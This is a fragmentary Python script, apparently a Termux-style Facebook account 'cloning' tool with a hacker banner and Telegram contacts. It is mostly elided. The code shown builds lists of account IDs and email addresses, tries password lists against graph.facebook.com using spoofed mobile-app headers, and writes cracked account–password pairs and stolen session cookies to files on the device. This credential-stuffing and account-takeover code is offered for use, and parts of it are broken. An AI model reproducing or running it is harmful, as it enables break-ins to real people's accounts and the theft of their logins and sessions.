...
expiry_time = datetime.strptime('''2023-11-02 13:00:00.000''', '''%Y-%m-%d %H:%M:%S.%f''')
if current_time > expiry_time:
    print('''ﺮﺟﺎﺑ ﻭﺍ ﻝﺰﻨﺗ ﻞﻴﻠﺑ ﻡﻮﻴﻟﺍ ﺮﻀﺘﻧﺍ''')
    exit(0)
import sys
import time
import os
...
for i in range(24):
    time.sleep(.1)
    sys.stdout.write("\rPRO... " + anim[i % len(anim)])
...
for i in range(80):
    time.sleep(.1)
    sys.stdout.write("\rﺕﻻﺎﺼﺗﻻﺍ ﺚﻳﺪﺤﺗ ﻱﺭﺎﺟ " + anim[i % len(anim)])
    sys.stdout.write(am[i % len(am)])
    sys.stdout.flush()
...
for i in range(30):
    time.sleep(.1)
    sys.stdout.write("\r...ﻼﻴﻠﻗ ﺮﻀﺘﻧﺍ " + anim[i % len(anim)])
    sys.stdout.write(am[i % len(am)])
    sys.stdout.flush()
...
\033[2;31m
\33[1;31m█▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀█
\33[1;32m█ \033[1;31m[•] Author   :  P R O
\33[1;33m█ \033[1;31m[•] TELEGRAM : @z7_6z - @BB22FF
\33[1;34m█ \033[1;31m[•] Version  : 1.0
\33[1;35m█ \033[1;31m[•] Network  : 3G/4G/FTTH ON
\33[1;36m█ \033[1;31m[•] Status   : Premium         
\33[1;33m█ \033[1;34m[•] TOOL     : Free
\33[1;35m█ \033[0;37m[•] GITHUB   : l5lmqq
\33[0;92m█▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄█
\033[1;92\x1b[1;31m
▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬1778▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬
\033[1;33m
...
def Hxw_Main():
    os.system("clear")
    print(logo)
    print (f"{oo(1)}\033[1;31m FILE CLONING")  

    
    print(f"{oo(0)}  EXIT")
    inpp = input(f"{oo('?')}\033[1;35m YOUR CHOICE : ")
    if inpp == "1":
        file()
    if inpp == '2':pak()
    if inpp =='3':
...
def file():
    ...
    if 'gm' in l:
        ...
        file = input(f"{oo('-')}\033[1;35m ENTER FILE: ")
    try:
...
def check(session,coki):
    ...
    if len(game)==0:
        ...
        for gm in game:
            print(f"\033[1;97m---\033[1;93m"+gm.replace('riJan','Hxw-182^)Code=BB22FF-2233]'))


####@-----Gmail-----@####

def gmail():     
        os.system('rm -rf .@H0773')
        ...
        for xd in range(int(limit)):
            ...
            if '3' in lchoice:
                ...
                open('.BB22FF','a').write(first.lower()+last.lower()+mail+domain+'|'+first+' '+last+'\n')
            else:
                mail = ''.join(random.choice(string.digits) for _ in range(4))
                open('.BB22FF','a').write(first.lower()+last.lower()+mail+domain+'|'+first+' '+last+'\n')
            fo = open('.BB22FF', 'r').read().splitlines()
...
def method():
    ...
    print('\033[1;89m='*63)
    print(f'{oo("✓")} TOTAL IDS : \033[1;32m'+str(len(accounts)))
    print()
    ...
    def start(user):
     try:
        ...
        sys.stdout.write('\r\033[1;91m[\033[1;97m1 7 7 8\033[1;91m]\033[1;97m {}-{} \033[1;91m[\033[1;97m{}\033[1;91m] \033[1;97mOK : \033[1;92m{} \033[1;97mCP : \033[1;91m{}       \r'.format(str(loop), str(len(accounts)), pers , str(len(okacc)) ,str(len(cpacc))))
        sys.stdout.flush()
            ...
            if 'session_key' in response.text:
                ...
                if c=='y':
                    try:
                           ...
                           print(cookies)
                           open('/sdcard/@H0773-OK.txt','a').write(f'sb={ssbb};{ckkk}\n')
    ...
    def start2(user):
      ...
      try:
        ...
        try:
            ...
            last = first
        pers = str(int(loop)/int(len(accounts)) * 100)[:4]
        sys.stdout.write('\r\033[1;91m[\033[1;97mBURKAN4\033[1;91m]\033[1;97m {}-{} \033[1;91m[\033[1;97m{}\033[1;91m] \033[1;97mOK : \033[1;92m{} \033[1;97mCP : \033[1;91m{}      \r'.format(str(loop), str(len(accounts)), pers , str(len(okacc)) ,str(len(cpacc))))
        sys.stdout.flush()
        for pword in totalpass:
            ...
            if 'session_key' in response.text:
                ...
                if c=='y':
                    try:
                           ...
                           cookies = f"sb={ssbb};{ckkk}"
                           print(cookies)
                           open('/sdcard/BURKAN-OK.txt','a').write(f'sb={ssbb};{ckkk}\n')
                    except Exception as e:print(str(e)+' | '+response.text)
                break
                ...
                if cpok=='n':
                     ...
                     print('\r\033[1;91m[\033[1;93[✘]••➟\033[1;91m] \033[1;93m'+acc+' \033[1;91m⚠\033[1;93m '+pword)
                cpacc.append(acc)
                open('/sdcard/@H0773-CP.txt','a').write(f'{acc} | {pword}\n')
                break
            else:
                continue
        loop += 1    
...
def andom():
    ...
    print(f"{oo('•')}/sdcard/@H0773-OK.txt")
    print('\033[1;93m='*25)
    print()    
    def start(user):
     try:
        ...
        try:
            ...
            last = first
        pers = str(int(loop)/int(len(accounts)) * 100)[:4]
        sys.stdout.write('\r\033[1;91m[\033[1;97mBURKAN6\033[1;91m]\033[1;97m {}-{} \033[1;91m[\033[1;97m{}\033[1;91m] \033[1;97mOK : \033[1;92m{} \033[1;97mCP : \033[1;91m{}       \r'.format(str(loop), str(len(accounts)), pers , str(len(okacc)) ,str(len(cpacc))))
        sys.stdout.flush()
        for pword in totalpass:              
      ...
      #      print(response.text)
            if 'session_key' in response.text:
                okacc.append(acc)
                print('\r\033[1;92m[\033[1;97mBURKAN5\033[1;92m] \033[1;97m'+acc+' \033[1;92m•\033[1;97m '+pword+'  ')
                open('/sdcard/@H0773-OK.txt','a').write(f'{acc} • {pword}\n')
                if c=='y':
                    try:
                           q = json.loads(response.text)
                           ckkk = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"])
                ...
                if cpok=='n':
                     ...
                     print('\r\033[1;91m[\033[1;97mBURKAN7\033[1;91m] \033[1;97m'+acc+' \033[1;91m•\033[1;97m '+pword+'   ')
                cpacc.append(acc)
                open('/sdcard/@H0773-CP.txt','a').write(f'{acc} • {pword}\n')
                break
            else:
    ...
    def start2(user):
      ...
      try:
        ...
        try:
            ...
            last = first
        pers = str(int(loop)/int(len(accounts)) * 100)[:4]
        sys.stdout.write('\r\033[1;91m[\033[1;97BURKAN8\033[1;91m]\033[1;97m {}-{} \033[1;91m[\033[1;97m{}\033[1;91m] \033[1;97mOK : \033[1;92m{} \033[1;97mCP : \033[1;91m{}      \r'.format(str(loop), str(len(accounts)), pers , str(len(okacc)) ,str(len(cpacc))))
        sys.stdout.flush()
        for pword in totalpass:
            heads = "Mozilla/5.0 (Linux; Android 9; Hisense Infinity E30 Lite Build/PPR1.180610.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/110.0.5481.153 Mobile Safari/537.36[FBAN/EMA;FBLC/en_US;FBAV/344.0.0.10.83;]"
            header = {"Content-Type": "application/x-www-form-accencoded","Host": "graph.facebook.com","User-Agent": AHMAD_ua,"X-FB-Net-HNI": "45204","X-FB-SIM-HNI": "45201","X-FB-Connection-Type": "unknown","X-Tigon-Is-Retry": "False","x-fb-session-id": "nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62","x-fb-device-group": "5120","X-FB-Friendly-Name": "ViewerReactionsMutation","X-FB-Request-Analytics-Tags": "graphservice","Accept-Encoding": "gzip, deflate","X-FB-HTTP-Engine": "Liger","X-FB-Client-IP": "True","X-FB-Server-Cluster": "True","x-fb-connection-token": "d29d67d37eca387482a8a5b740f84f62","Connection": "Keep-Alive"}
            ...
            if 'session_key' in response.text:
                okacc.append(acc)
                print('\r\033[1;92m[\033[1;97BURKAN9\033[1;92m] \033[1;97m'+acc+' \033[1;92m•\033[1;97m '+pword+'  ')
                open('/sdcard/@H0773-OK.txt','a').write(f'{acc} • {pword}\n')
                if 'y' in apps:
                	check(r,coki)
                if c=='y':
                ...
                if cpok=='n':
                     ...
                     print('\r\033[1;91m[\033[1;97BURKAN10\033[1;91m] \033[1;97m'+acc+' \033[1;91m•\033[1;97m '+pword)
                cpacc.append(acc)
                open('/sdcard/@H0773-CP.txt','a').write(f'{acc} • {pword}\n')
                break
            else:
